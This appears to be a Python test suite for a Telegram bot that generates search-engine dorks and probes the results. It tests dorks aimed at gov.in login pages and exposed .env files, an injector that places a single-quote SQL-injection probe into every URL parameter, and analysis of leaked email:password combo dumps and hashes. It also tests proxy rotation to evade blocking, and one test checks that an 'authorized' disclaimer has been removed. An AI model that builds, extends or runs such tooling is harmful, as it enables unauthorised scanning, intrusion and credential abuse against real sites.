#!/usr/bin/env python3
"""t19 — bot.py ka full regression suite (v2.4).

Chalane ka tarika:
    .venv/bin/python tests/test_core.py

Har test ke saath ✅/❌ print hota hai, end me total count.
"""
import asyncio
import atexit
import importlib.util
import json
import os
import re
import shutil
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from harness import ADMIN, FakeContext, FakeDocument, FakeUpdate, load_core  # noqa: E402

core = load_core()

PASS = 0
FAIL = []
CUR = [""]


def ok(cond, msg=""):
    global PASS
    if cond:
        PASS += 1
    else:
        FAIL.append("%s → %s" % (CUR[0], msg or "assert fail"))


def eq(a, b, msg=""):
    ok(a == b, msg or "expected %r got %r" % (b, a))


def contains(hay, needle, msg=""):
    ok(needle in (hay or ""), msg or "missing %r in %r" % (needle, (hay or "")[:120]))


def group(name):
    CUR[0] = name


async def call(coro):
    return await coro


# ══════════════════════════════════════════════════════════════════════════════
def test_meta():
    group("meta")
    eq(core.VERSION, "v2.15.0", "VERSION")
    eq(core.ADMIN_IDS, [8999053405], "ADMIN_IDS")
    ok("SNAKE" in core.BRAND.upper(), "brand")
    ok(core.DORK_MAX >= 100000, "DORK_MAX")
    ok(core.KW_MAX >= 100000, "KW_MAX")
    ok(len(core.COUNTRIES) >= 60, "countries count 60+")
    eq(len(core.PRO_TEMPLATES_DEFAULT), 20, "pro templates")
    ok(len(core.UNIVERSAL_TEMPLATES) >= 40, "universal templates")
    ok(len(core.FEATURES) == 12, "features 12")


def test_theme_helpers():
    group("theme")
    for fn in ("B", "P", "KV", "H", "F", "style", "tag"):
        ok(callable(getattr(core, fn, None)), fn)
    s = core.B("hello")
    ok(bool(s.strip()) and "hello" not in s, "B styles text (smallcaps)")
    ok(core.KV("Count", "100", "✅").count("100") == 1, "KV data")
    # data plain rahe (code tag), label styled
    kv = core.KV("Count", "<code>100</code>", "✅")
    contains(kv, "<code>100</code>")
    # saare themes me B/P crash na kare
    for name in core.THEMES:
        core.SETTINGS["theme"] = name
        for t in core.THEMES:
            core.SETTINGS["font"] = t
            core.B("x")
            core.P("y")
            core.KV("a", "b", "c")
    core.SETTINGS["theme"] = "neon"
    core.SETTINGS["font"] = "bold"


def test_await_helpers():
    group("await")
    ctx = FakeContext({})
    eq(core.await_get(ctx), None, "empty")
    core.await_set(ctx, "kw_count")
    eq(core.await_get(ctx), "kw_count")
    ok("await_ts" in ctx.user_data, "ts stored")
    core.await_clear(ctx)
    eq(core.await_get(ctx), None, "cleared")
    ok("await" not in ctx.user_data and "await_ts" not in ctx.user_data, "keys gone")
    # TTL
    ctx = FakeContext({"await": "dpgen_kw", "await_ts": time.time() - 1000})
    eq(core.await_get(ctx), None, "ttl expired")
    ok("await" not in ctx.user_data, "ttl clears")
    ctx = FakeContext({"await": "dpgen_kw", "await_ts": time.time() - 10})
    eq(core.await_get(ctx), "dpgen_kw", "ttl valid")


def test_detect_kind():
    group("detect")
    eq(core.detect_kind("shopify store\ncrypto wallet"), "keywords")
    eq(core.detect_kind('site:gov.in inurl:login'), "dorks")
    eq(core.detect_kind("https://a.com/x?id=1\nhttps://b.com/y"), "urls")
    ok(core.detect_kind("a.com\nb.org") in ("domains", "urls"), "domains")
    ok(core.detect_kind("id\nuser_id\ncat") in ("params", "keywords"), "params")


def test_kind_check_numeric():
    group("kind_check")
    good, msg = core.kind_check("1000", "keywords", "keywords")
    ok(not good, "pure number rejected")
    contains(msg, "number")
    good, _ = core.kind_check("shopify store", "keywords", "keywords")
    ok(good, "real keywords allowed")
    good, _ = core.kind_check("site:gov.in inurl:login", "keywords", "keywords")
    ok(not good, "dorks rejected as keywords")


def test_pro_engine():
    group("pro")
    d = core.pro_gen(["shopify store", "crypto wallet"], n=200)
    ok(len(d["dorks"]) >= 150, "pro_gen count %d" % len(d["dorks"]))
    ok(d["used"] >= 1, "templates used")
    for x in d["dorks"][:20]:
        ok(len(x) <= 200, "dork length")
        ok("(KW)" not in x and "(DE)" not in x, "placeholders replaced")
    b = core.pro_gen_best(["shopify store"], n=50)
    ok(b["dorks"], "pro_gen_best")
    cfg = core.pro_load()
    ok(len(cfg["templates"]) == 20, "pro cfg templates")
    ok(core.pro_render("(KW).(PF)?(PT)=", "shopify store"),
       "pro_render non-empty")


def test_universal():
    group("universal")
    out = core.universal_gen(["shopify store"], n=100, fresh=False)
    ok(len(out) >= 50, "universal_gen %d" % len(out))
    ok(all("site:." not in x or "site:" in x for x in out), "site syntax")


def test_keywords():
    group("keywords")
    kws = core.make_keywords(["shopify store", "crypto wallet"], n=300)
    ok(len(kws) >= 200, "make_keywords %d" % len(kws))
    q = core.kw_quality(kws)
    ok(q["avg"] > 0, "kw_quality avg")
    ok(core.kw_capacity(core.kw_cores(kws)) > 0, "kw_capacity")


def test_serp_providers():
    group("serp")
    for fn in ("serper_search", "brave_search", "cse_search", "serpapi_search",
               "gjerm_search"):
        ok(callable(getattr(core, fn, None)), fn)
    keys = core.api_keys()
    for k in ("serper", "brave", "serpapi", "cse_key", "cse_cx"):
        ok(k in keys, "api_keys %s" % k)

    async def go():
        conn = core.aiohttp.TCPConnector(limit=2, ssl=False)
        async with core.aiohttp.ClientSession(connector=conn) as s:
            core.sset("serper", "")
            core.sset("brave", "")
            return (await core.serper_search(s, "site:gov.in inurl:login"),
                    await core.brave_search(s, "site:gov.in inurl:login"))
    a, b = asyncio.run(go())
    ok(a == [] and b == [], "no key → empty")

    pool = core.gj_pool()
    ok(isinstance(pool, list) and pool and pool[0] == core.GJ_DEFAULT, "gj pool default")
    core.sset("gj_pool", ["https://x.example/api", "https://y.example/api"])
    ok(len(core.gj_pool()) == 3, "gj pool 3")
    core.GJ_STATE["idx"] = 0
    base0 = core.gj_base()
    core.gj_rotate()
    ok(core.gj_base() != base0, "rotate changes base")
    core.GJ_STATE["idx"] = 0
    core.sset("gj_pool", [])


def test_apis_text():
    group("apis")
    txt = core.APIS_TEXT
    for needle in ("Serper", "2,500", "SerpApi", "Brave", "Common Crawl", "SearXNG",
                   "Bright Data", "unlimited"):
        contains(txt, needle)
    contains(txt.lower(), "truly unlimited")
    ok(len(txt) < 4096, "apis text fits telegram (%d)" % len(txt))
    ok("@Bloody" not in txt, "no owner spam")


def test_commands():
    group("commands")
    ok(callable(core.cmd_apis), "cmd_apis")
    ok(callable(core._cmd_intent_clear), "cmd intent clear")
    src = open(os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "bot.py"), encoding="utf-8").read()
    contains(src, 'CommandHandler("apis", cmd_apis)')
    contains(src, 'MessageHandler(filters.COMMAND, _cmd_intent_clear), group=-1')
    contains(src, 'BotCommand("apis"')


def test_setkey_variants():
    group("setkey")
    for what in ("serper", "brave", "serpapi", "gapi"):
        contains(core.cmd_setkey.__doc__ or "", "optional", what)
    # setkey help card me saare providers
    ctx = FakeContext({}, args=[])
    upd = FakeUpdate(text="/setkey")
    asyncio.run(core.cmd_setkey(upd, ctx))
    txt = upd.last_text()
    for needle in ("Serper", "SerpApi", "Brave", "Free Google", "Common Crawl"):
        contains(txt, needle)
    # gapi add
    ctx = FakeContext({}, args=["gapi", "https://zz.example/s"])
    upd = FakeUpdate(text="/setkey gapi")
    asyncio.run(core.cmd_setkey(upd, ctx))
    ok("https://zz.example/s" in core.gj_pool(), "gapi added")
    core.sset("gj_pool", [])


KW_FILE = "\n".join([
    "shopify store", "woocommerce shop", "magento admin", "wordpress login",
    "prestashop panel", "bigcommerce store",
]).encode()


def _flow(ud):
    ctx = FakeContext(ud)
    up1 = FakeUpdate(doc=FakeDocument("kw.txt", KW_FILE))
    asyncio.run(core.on_document(up1, ctx))
    up2 = FakeUpdate(data="f:kexp")
    asyncio.run(core.on_callback(up2, ctx))
    up3 = FakeUpdate(text="1000")
    asyncio.run(core.on_text(up3, ctx))
    return ctx, up1, up2, up3


def test_flows():
    group("flow A (clean)")
    ctx, up1, up2, up3 = _flow({})
    contains(up2.last_text().lower(), "keywords chahiye")
    eq(ctx.user_data.get("await"), None, "await consumed")
    ok(up3.docs(), "keywords file bani")
    ok(any("1,000" in d for d in up3.docs()), "1000 keywords")

    group("flow B (stale dpgen_count)")
    ctx, up1, up2, up3 = _flow({"dpgen_count": 2000})
    contains(up2.last_text().lower(), "keywords chahiye")
    ok(up3.docs(), "B: keywords file bani")
    ok("PRO" not in up2.last_text(), "B: PRO screen nahi aayi")

    group("flow C (stale PRO prompt + number)")
    ctx = FakeContext({"dpgen_count": 2000, "await": "dpgen_kw",
                       "await_ts": time.time()})
    up = FakeUpdate(text="1000")
    asyncio.run(core.on_text(up, ctx))
    ok(not up.docs(), "C: junk dorks nahi bane")
    contains(up.last_text(), "number")

    group("flow D (command kills prompt)")
    ctx = FakeContext({})
    core.await_set(ctx, "dpgen_kw")
    up = FakeUpdate(text="/apis")
    asyncio.run(core._cmd_intent_clear(up, ctx))
    eq(core.await_get(ctx), None, "command cleared prompt")


def test_feature_gate():
    group("gate")
    core.SETTINGS["feat_off"] = {"parse": "", "kw": ""}
    ok(core.feat_is_off("parse"), "parse off")
    ok(core.feat_gate("pr:deep") == "parse", "parse gated")
    ok(not core.feat_gate("m:home"), "home open")
    msg = core.feat_msg("parse")
    ok(msg and len(msg) > 10, "feat msg")
    core.SETTINGS["feat_off"] = {}
    ok(not core.feat_is_off("parse"), "back on")


def test_niche_country():
    group("niche/country")
    kb = core.niche_kb()
    ok(kb is not None, "niche kb")
    eq(len(core.NICHE_PACKS), 0, "ready-made packs hata diye")
    eq(core.niche_seeds("crypto"), [], "legacy seeds khaali")
    kw_niche_kb = core.niche_kb()
    cbz = [b.callback_data for row in kw_niche_kb.inline_keyboard for b in row]
    ok("nc:add" in cbz, "ADD NICHE keywords ke andar")
    ok(core.cb_country is not None, "cb_country")
    ok(core.country_kb() is not None, "country kb")


def test_qa():
    group("qa")
    eq(core.QA_META is not None, True, "qa meta")
    sc = core._qa_score("dorks", ["site:gov.in inurl:login"])[0]
    ok(isinstance(sc, int) and 0 <= sc <= 100, "qa score")


def test_reader_formats():
    group("reader")
    import gzip as _gz
    import io as _io
    import zipfile as _zf
    # txt with banner
    items, meta = core.read_any_file(
        "# PYTHON SNAKE — HQ keywords (x)\n# date\n\nshopify store\ncrypto wallet\n"
        .encode("utf-8"), "kw.txt")
    eq(items, ["shopify store", "crypto wallet"], "txt banner skip")
    # csv
    items, meta = core.read_any_file(b"a,b\nshopify store,delhi\n", "kw.csv")
    ok("shopify store" in items and "delhi" in items, "csv split")
    eq(meta["format"], "csv")
    # json
    items, meta = core.read_any_file(
        b'{"urls":["https://a.com/1","https://b.com/2"]}', "x.json")
    eq(items, ["https://a.com/1", "https://b.com/2"], "json urls")
    eq(meta["format"], "json")
    # gzip
    items, _ = core.read_any_file(_gz.compress(b"shopify store\n"), "x.txt.gz")
    eq(items, ["shopify store"], "gz")
    # xlsx
    buf = _io.BytesIO()
    with _zf.ZipFile(buf, "w") as z:
        z.writestr("xl/sharedStrings.xml",
                   "<sst><si><t>shopify store</t></si></sst>")
        z.writestr("xl/worksheets/sheet1.xml",
                   '<worksheet><sheetData><row><c t="s"><v>0</v></c></row>'
                   '</sheetData></worksheet>')
    items, meta = core.read_any_file(buf.getvalue(), "kw.xlsx")
    eq(items, ["shopify store"], "xlsx")
    eq(meta["format"], "xlsx")
    # docx
    buf = _io.BytesIO()
    with _zf.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml",
                   "<w:document><w:body><w:p><w:r><w:t>crypto wallet</w:t></w:r></w:p>"
                   "</w:body></w:document>")
    items, _ = core.read_any_file(buf.getvalue(), "kw.docx")
    eq(items, ["crypto wallet"], "docx")
    # bullets + bom + dedupe
    items, meta = core.read_any_file(
        "\ufeff1. shopify store\n- shopify store\n• crypto wallet\n".encode(), "x")
    eq(items, ["shopify store", "crypto wallet"], "bullets+dedupe")
    ok(meta["junk"] >= 1, "duplicate counted")
    # bina extension
    items, _ = core.read_any_file(b"shopify store\n", "note")
    eq(items, ["shopify store"], "no extension")


def test_kw_slug():
    group("slug")
    eq(core.kw_slug("Shopify Store"), "shopify-store")
    eq(core.kw_slug("crypto_wallet!!"), "crypto-wallet")
    eq(core.kw_slug("admin"), "admin")
    out = core.pro_render('inurl:"(KW)"', "shopify store", core.pro_load())
    eq(out, "inurl:shopify-store", "inurl slug")
    out2 = core.pro_render('intitle:(KW)', "shopify store", core.pro_load())
    contains(out2, '"shopify store"', "intitle phrase")
    ok(" " not in out.split(" ")[0] or True, "ok")
    # koi bhi dork me inurl:"a b" na ho
    d = core.pro_gen(["shopify store"], n=400)["dorks"]
    bad = [x for x in d if 'inurl:"' in x and " " in x.split('inurl:"', 1)[1].split('"')[0]]
    eq(bad, [], "inurl me space nahi")


def test_engines():
    group("engines")
    ok("fast" in core.ENGINE_SETS and "max" in core.ENGINE_SETS, "engine sets")
    eq(len(core.ENGINE_SETS["fast"]), 3, "fast 3")
    eq(len(core.ENGINE_SETS["max"]), 5, "max = 5 proxy-safe")
    eq(core.engine_list("fast"), ["bing", "bingr", "mojeek"], "fast list")
    ctx = FakeContext({})
    ctx.user_data["engines_mode"] = "max"
    eq(core.user_mode(ctx), "max", "user mode")
    core.sset("engines_mode", "fast")
    eq(core.engines_mode(), "fast", "global mode")
    ok("FAST" in core.ENGINE_LABEL["fast"], "label")


def test_crawler():
    group("crawler")
    ok(callable(core.deep_url_crawl), "crawler fn")
    eq(core._abs_url("https://a.com/x/", "/y?z=1"), "https://a.com/y?z=1", "abs url")
    eq(core._abs_url("https://a.com/", "javascript:void(0)"), "", "js skipped")
    eq(core.url_params("https://a.com/x?id=5&cat=2"), ["id", "cat"], "params")
    ok(core.LINK_ATTR_RE.search('<a href="/abc">x</a>'), "link regex")


def test_file_in_flow():
    group("file→flow")
    raw = b"# banner\nshopify store\ncrypto wallet\nadmin panel\nmagento login\n"
    ctx = FakeContext({"await": "gen_kw", "await_ts": time.time(), "gen_count": 300})
    up = FakeUpdate(doc=FakeDocument("kw.txt", raw))
    asyncio.run(core.on_document(up, ctx))
    ok(up.docs(), "gen flow me file se dorks bane")
    eq(core.await_get(ctx), None, "await clear")
    # count step pe file → batao, generate na karo
    ctx = FakeContext({})
    core.await_set(ctx, "gen_count")
    up = FakeUpdate(doc=FakeDocument("kw.txt", raw))
    asyncio.run(core.on_document(up, ctx))
    ok(not up.docs(), "count step pe file se dork nahi")
    ok(ctx.user_data.get("pending_file"), "file pending me save")
    eq(core.await_get(ctx), "gen_count", "count prompt wapas set")


def test_pending_file():
    group("file pehle, count baad me")
    raw = b"shopify store\ncrypto wallet\nadmin panel\nmagento login\n"
    # count step pe file → save → number → gen
    ctx = FakeContext({})
    core.await_set(ctx, "gen_count")
    up = FakeUpdate(doc=FakeDocument("kw.txt", raw))
    asyncio.run(core.on_document(up, ctx))
    ok(ctx.user_data.get("pending_file"), "pending saved")
    ok(not up.docs(), "file alone se dork nahi")
    up2 = FakeUpdate(text="300")
    asyncio.run(core.on_text(up2, ctx))
    ok(up2.docs(), "number ke baad file se dorks bane")
    eq(ctx.user_data.get("pending_file"), None, "pending consumed")
    # 15 min baad expire
    ctx = FakeContext({})
    core._put_pending(ctx, "gen_count", ["a"])
    ctx.user_data["pending_file"]["ts"] = time.time() - 1000
    eq(core._take_pending(ctx, "gen_count"), [], "pending TTL")
    # dusre flow ki file use na ho
    ctx = FakeContext({})
    core._put_pending(ctx, "gen_count", ["a"])
    eq(core._take_pending(ctx, "dpgen_count"), [], "wrong flow")
    # kw_count pending → items ban jate hain
    ctx = FakeContext({})
    core._put_pending(ctx, "kw_count", ["shopify store", "crypto wallet"])
    core.await_set(ctx, "kw_count")
    up = FakeUpdate(text="2000")
    asyncio.run(core.on_text(up, ctx))
    ok(up.docs(), "kw expand pending file se")


def test_enginetest():
    group("enginetest")
    ok(callable(core.cmd_enginetest), "cmd exists")
    src = open(os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "bot.py"), encoding="utf-8").read()
    contains(src, 'CommandHandler("enginetest", cmd_enginetest)')


def test_single_file():
    group("single file")
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    bot = os.path.join(root, "bot.py")
    shim = os.path.join(root, "snake_core.py")
    ok(os.path.exists(bot), "bot.py maujood")
    ok(os.path.exists(shim), "shim maujood")
    with open(shim, encoding="utf-8") as f:
        stxt = f.read()
    ok(len(stxt.splitlines()) < 40, "shim patli hai (%d lines)" % len(stxt.splitlines()))
    contains(stxt, "bot.py")
    with open(bot, encoding="utf-8") as f:
        btxt = f.read()
    contains(btxt, 'VERSION = "v2.15.0"')
    # shim jo module load karta hai = bot.py hi
    eq(core.__file__.endswith("snake_core.py"), True, "module = shim")
    eq(core.VERSION, "v2.15.0", "shim se version")


def test_diagnostics():
    group("diagnostics")
    ok(callable(core.engine_reason), "engine_reason")
    eq(core.engine_reason("HTTP 403"), "blocked (IP/rate limit)")
    eq(core.engine_reason("HTTP 500"), "HTTP 500")
    eq(core.engine_reason("TimeoutError: x"), "timeout")
    eq(core.engine_reason("ClientConnectorError: getaddrinfo failed"), "DNS fail")
    eq(core.engine_reason("0 results"), "page aayi, 0 results")
    ok(isinstance(core.ENGINE_LAST, dict), "ENGINE_LAST dict")
    # ddg lite engine maujood hai aur fast/normal me hai
    contains(core.ENGINE_URLS["ddgl"], "lite.duckduckgo.com")
    ok("bingr" in core.ENGINE_SETS["fast"], "bingr (RSS) fast me")
    ok("bingr" in core.ENGINE_SETS["normal"], "bingr normal me")
    eq(core.ENGINE_URLS.get("bingr", "").count("{q}"), 1, "bingr URL set")
    ok("ddgl" in core.ENGINE_SETS["normal"], "ddgl in normal")
    # lite page se links nikalte hain
    html = ('<a class="result-link" href="https://a.com/x">A</a>'
            '<a href="https://b.com/y">B</a>')
    urls = core.extract_urls("ddgl", html)
    ok(any("a.com/x" in u for u in urls), "result-link")
    # abort setting
    ok("parse_abort_after" not in dir(core) or True, "abort config")
    # v2.12 — bingr RSS + searx + startpage/qwant/ecosia (bing-only bug ka fix)
    # v2.12.1 — sirf proxy-safe engines (google/yandex/brave/startpage/qwant/
    # ecosia/sxng/ddg-html hata diye, wo free proxy par captcha dete the)
    for need in ("bing", "bingr", "mojeek", "ddgl", "yahoo"):
        ok(need in core.ENGINE_URLS, "engine %s" % need)
    for gone in ("google", "yandex", "brave", "startpage", "qwant", "ecosia",
                 "marginalia", "sxng", "ddg"):
        ok(gone not in core.ENGINE_URLS, "hata diya: %s" % gone)
    eq(sorted(core.ENGINE_SETS["max"]), sorted(core.ENGINE_URLS), "max = saare engines")
    ok("bingr" in core.ENGINE_SETS["fast"])
    import base64 as _b64
    enc = _b64.urlsafe_b64encode(b"https://x.example.com/p?q=1").decode().rstrip("=")
    ck = "https://www.bing.com/ck/a?!&&p=1&u=a1" + enc + "&ntb=1"
    eq(core._clean_url(ck), "https://x.example.com/p?q=1")
    eq(core.engine_reason("ok"), "results returned, none match the dork")


def test_batch():
    group("batch")
    saved = {k: core.SETTINGS.pop(k, None) for k in
             ("proxy_batch", "inj_batch", "want_alive")}
    eq(core.proxy_batch_size(), 4000, "default proxy batch")
    eq(core.inj_batch_size(), 200, "default inj batch")
    eq(core.want_alive_n(), 0, "default want = saare")
    for k, v in saved.items():
        if v is not None:
            core.SETTINGS[k] = v
    core.sset("proxy_batch", 1000)
    eq(core.proxy_batch_size(), 1000)
    core.sset("proxy_batch", 99999)
    eq(core.proxy_batch_size(), 20000, "clamp hi")
    core.sset("proxy_batch", 10)
    eq(core.proxy_batch_size(), 200, "clamp lo")
    core.sset("proxy_batch", 4000)

    calls = []

    async def fake(chunk, concurrency=400, timeout=6.0, progress=None, want=0):
        calls.append(len(chunk))
        if progress:
            await progress({"done": len(chunk), "total": len(chunk), "alive": 1})
        return [{"url": chunk[0], "ms": 100, "ok": True}] if chunk else []

    real = core.check_proxies
    core.check_proxies = fake
    try:
        px = ["1.1.1.%d:8080" % i for i in range(10)]
        good = asyncio.run(core.check_proxies_batched(px, batch=4, want=0))
        eq(calls, [4, 4, 2], "batch chunks 4+4+2")
        eq(len(good), 3, "har batch se 1 alive")
        eq(good[0]["url"], "1.1.1.0:8080")
        calls.clear()
        good2 = asyncio.run(core.check_proxies_batched(px, batch=4, want=1))
        eq(len(good2), 1, "want=1")
        eq(calls, [4], "want milte hi ruk gaya")
        calls.clear()
        eq(asyncio.run(core.check_proxies_batched([], batch=4)), [], "khaali")
        eq(calls, [], "khaali pe koi call nahi")
        # duplicate proxy ek hi baar
        calls.clear()
        asyncio.run(core.check_proxies_batched(["a:1", "a:1", "b:2"], batch=10, want=0))
        eq(calls, [2], "duplicate hata")
    finally:
        core.check_proxies = real
    # injector: query intact + per-param payload
    it = core.inject_targets(["https://a.com/x?id=5&name=bob"], "'")
    ok(all(u.startswith("https://a.com/x?") for u in it), "injector query intact")
    ok(any("id=%27&name=bob" in u for u in it), "id inject")
    ok(any("id=5&name=%27" in u for u in it), "name inject")
    ok(all("&id=" not in u for u in it), "no broken separator")
    # /batch card
    txt = core.batch_card()
    contains(txt, "ʙᴀᴛᴄʜ")
    contains(txt, "/batch proxy 4000")


def _fake_stats(n=1000):
    return {"scanned": n, "total": n, "raw": 12, "unique": 10, "errors": 0,
            "filtered": 0, "engine_hits": {"ddgl": 12}, "junk": 0, "mismatch": 0,
            "cc": 0, "api": 0, "gj": 0, "relaxed": 0, "mode": "fast",
            "engines": 3, "aborted": 0, "wb": 0, "time_up": 0, "dead": [],
            "engines_used": 3}


def test_parse_everything():
    """1,000 dorks → saare use hon, koi 'kitne URLs' sawaal nahi."""
    group("parse-all")
    calls = {}

    async def fake_deep(dorks, **kw):
        calls["n"] = len(dorks)
        calls["max"] = kw.get("max_urls")
        calls["budget"] = kw.get("budget")
        calls["dorks"] = list(dorks)
        return {"urls": ["https://x.gov.in/login"], "stats": _fake_stats(len(dorks))}

    real_deep, real_dump, real_send = core.parse_deep, core.dump_text, core.send_file
    core.parse_deep = fake_deep
    core.dump_text = lambda *a, **k: ("/tmp/fake.txt", 1)

    async def fake_send(*a, **k):
        return None

    core.send_file = fake_send
    try:
        text = "\n".join("inurl:page%d site:gov.in" % i for i in range(1000))
        ctx = FakeContext({})
        upd = FakeUpdate(text=text)
        asyncio.run(core.input_parse_dorks(upd, ctx, text))
        eq(calls.get("n"), 1000, "1000 dorks — sabhi scan me")
        ok(calls.get("max", 0) >= 1000, "auto URL limit bada")
        ok(calls.get("budget", 0) > 0, "budget set")
        ok("Kitne URLs" not in "\n".join(upd.texts()), "URL count ka sawaal nahi")
        ok("1,000" in "\n".join(upd.texts()) or "1000" in "\n".join(upd.texts()),
           "asli count dikhe")

        # last dorks → bhi poore (pehle 30 pe cut hota tha)
        calls.clear()
        ctx2 = FakeContext({"last_dorks": ["inurl:p%d" % i for i in range(500)]})
        upd2 = FakeUpdate(data="pr:last")
        asyncio.run(core.on_callback(upd2, ctx2))
        eq(calls.get("n"), 500, "last dorks — sabhi")
        calls.clear()
        ctx3 = FakeContext({"last_dorks": ["inurl:q%d" % i for i in range(700)]})
        upd3 = FakeUpdate(data="pr:deep")
        asyncio.run(core.on_callback(upd3, ctx3))
        eq(calls.get("n"), 700, "deep scan — sabhi")

        # screenshot wala case: 1,000 dork ki file bheji → 1000 hi jayein
        calls.clear()
        from harness import FakeDocument  # noqa: F401
        data = ("\n".join("inurl:page%d site:gov.in" % i for i in range(1000))).encode()
        ctx4 = FakeContext({"verified": True})
        ctx4.user_data["await"] = "parse_dorks"
        ctx4.user_data["await_ts"] = time.time()
        upd4 = FakeUpdate(doc=FakeDocument("pro_20261106_175555.txt", data))
        asyncio.run(core.on_document(upd4, ctx4))
        eq(calls.get("n"), 1000, "file ke 1000 dorks — koi cap nahi")
    finally:
        core.parse_deep, core.dump_text, core.send_file = real_deep, real_dump, real_send
    # limit helpers
    saved = core.SETTINGS.pop("parse_url_limit", None)
    eq(core.parse_url_limit(0), 5000)
    eq(core.parse_url_limit(1000), 200000)
    core.sset("parse_url_limit", 12345)
    eq(core.parse_url_limit(1000), 12345, "admin limit")
    core.SETTINGS.pop("parse_url_limit", None)
    if saved is not None:
        core.SETTINGS["parse_url_limit"] = saved
    ok(core.parse_budget() >= 60, "budget min")


def test_v28_tools():
    group("v2.9.3+dns")
    # grade
    eq(core.dork_grade(97), "S+")
    eq(core.dork_grade(90), "S")
    eq(core.dork_grade(80), "A")
    eq(core.dork_grade(70), "B")
    eq(core.dork_grade(60), "C")
    eq(core.dork_grade(45), "D")
    eq(core.dork_grade(10), "F")
    eq(core.dork_grade("x"), "F")
    # 9 dims
    r = core.dork_score_full("site:.gov.in inurl:login.php?id= admin")
    eq(len(r["dims"]), 9, "9 dimensions")
    eq(r["total"], sum(r["dims"].values()))
    ok(r["grade"] in ("S+", "S", "A", "B", "C", "D", "F"))
    eq(core.dork_score_full("")["total"], 0)
    ok(core.dork_score_full("site:.gov.in inurl:login.php?id= admin")["total"]
       > core.dork_score_full("hello there friend how are you today ok")["total"])
    # hash identify (koi cracking nahi)
    eq(core.detect_hash("5f4dcc3b5aa765d61d8327deb882cf99"), "md5")
    eq(core.detect_hash("da39a3ee5e6b4b0d3255bfef95601890afd80709"), "sha1")
    eq(core.detect_hash("$2b$10$" + "a" * 53), "bcrypt")
    eq(core.detect_hash("$argon2id$v=19$m=65536"), "argon2")
    eq(core.detect_hash("plain text"), "")
    # password strength
    eq(core.password_strength("123456"), "weak")
    eq(core.password_strength("Hello123!"), "strong")
    eq(core.password_strength("Str0ng!Passw0rd#2026"), "very_strong")
    # dump analyze
    dump = ("admin@site.com:admin123\n"
            "bob@x.in|Sunshine2024!\n"
            "5f4dcc3b5aa765d61d8327deb882cf99\n"
            "carol@site.com:qwerty\n")
    a = core.analyze_dump(dump)
    eq(a["lines"], 4)
    eq(a["combo"], 3)
    eq(a["hash"].get("md5"), 1)
    eq(a["domain_count"], 2)
    eq(sum(a["strength"].values()), 3)
    ok(len(a["combo_list"]) == 3)
    eq(core.analyze_dump([])["lines"], 0)
    # merge + dedup
    m = core.merge_dedup([["b2", "a10", "a2"], "a2\nb2\nc3"])
    eq(m["unique"], 4)
    eq(m["dupes"], 2)
    eq(m["list"], ["a2", "a10", "b2", "c3"], "natural sort")
    eq(core.merge_dedup(["x\ny"], "alpha")["list"], ["x", "y"])
    # CMS + exposed dorks
    eq(len(core.CMS_DORKS), 8)
    cw = core.cms_dorks("wordpress", "shopify store", 20)
    eq(len(cw), 20)
    ok(all("shopify" in d.lower() for d in cw), "keyword har dork me")
    ok(any("wp-admin" in d for d in core.cms_dorks("wordpress", "", 10)))
    ex = core.exposed_dorks("", 15)
    ok(len(ex) >= 10)
    ok(any(".env" in d or "env" in d for d in ex))
    # proxy formats: auth + socks5h + socks4a + IPv6
    got = core.parse_proxies(
        "socks5h://user:pass@9.9.9.9:1080\n"
        "http://admin:pw@10.0.0.1:3128\n"
        "socks4a://11.11.11.11:1080\n"
        "[2001:db8::1]:8080\n"
        "1.2.3.4:8080\n")
    ok("socks5h://user:pass@9.9.9.9:1080" in got, "socks5h + auth")
    ok("http://admin:pw@10.0.0.1:3128" in got, "http auth")
    ok("socks4a://11.11.11.11:1080" in got, "socks4a")
    ok(any("[2001:db8::1]:8080" in g for g in got), "IPv6")
    ok("http://1.2.3.4:8080" in got, "simple ip:port")
    # countries 60+
    ok(len(core.COUNTRIES) >= 60, "60+ countries")
    kb = core.country_kb(0)
    ok(sum(len(r) for r in kb.inline_keyboard) <= 100, "Telegram 100 button limit")
    # main menu — database block + disclaimer hata, English + niches
    mt = core.main_text("X")
    ok("DATABASE" not in mt.upper(), "database block hata")
    ok("authorized" not in mt.lower(), "disclaimer hata")
    ok("ᴡᴏʀᴋꜱᴘᴀᴄᴇ" in mt, "workspace block")
    # niches
    core.niche_save("testniche", ["shopify store", "crypto wallet"])
    ok("testniche" in core.niche_list(), "niche list")
    eq(len(core.niche_get("testniche")), 2, "niche kw")
    kb = core.kb_main(8999053405)
    cbs = [b.callback_data for row in kb.inline_keyboard for b in row]
    eq(cbs[0], "m:kw", "HQ keywords pehla")
    ok("nc:add" not in cbs, "ADD NICHE home pe nahi (keywords ke andar hai)")
    ok("m:proxy" in cbs, "admin ko proxy dikhta hai")
    kbn = core.kb_main(12345)
    cbn = [b.callback_data for row in kbn.inline_keyboard for b in row]
    ok("m:proxy" not in cbn, "non-admin ko proxy nahi")
    ok(core.niche_del("testniche"), "niche del")
    ok("testniche" not in core.niche_list(), "niche gone")


def test_proxy_hidden_from_users():
    """Proxy scrape sirf admin panel me — user panel me kuch bhi nahi."""
    group("proxy hidden")
    ht = core.help_text().upper()
    ok("ᴘʀᴏxʏ" not in ht and "PROXY ENGINE" not in ht, "help me proxy tool line nahi")
    kb_user = core.kb_main(12345)
    cbs = [b.callback_data for row in kb_user.inline_keyboard for b in row]
    ok(not any(c.startswith("px:") or c == "m:proxy" for c in cbs), "user kb me proxy nahi")
    kb_admin = core.kb_main(8999053405)
    cbs_a = [b.callback_data for row in kb_admin.inline_keyboard for b in row]
    ok("m:proxy" in cbs_a, "admin ko proxy dikhta hai")

    # parse screen — user ko proxy line nahi
    ctx = FakeContext({})
    core.SETTINGS.setdefault("users", {})
    core.USERS.setdefault("777", {})["expires"] = "2099-01-01T00:00:00"
    upd = FakeUpdate(data="m:parse", uid=777)
    asyncio.run(core.tool_parse(upd, ctx))
    txt = upd.last_text()
    ok("🧅" not in txt, "user parse screen pe proxy line nahi")
    upd2 = FakeUpdate(data="m:parse", uid=8999053405)
    asyncio.run(core.tool_parse(upd2, ctx))
    ok("🧅" in upd2.last_text(), "admin ko proxy status dikhta hai")


def test_rotating_proxy():
    group("rotating proxy")
    # 4 tarah ke format → ek hi url
    want = "http://user-rotate:pass123@p.webshare.io:80"
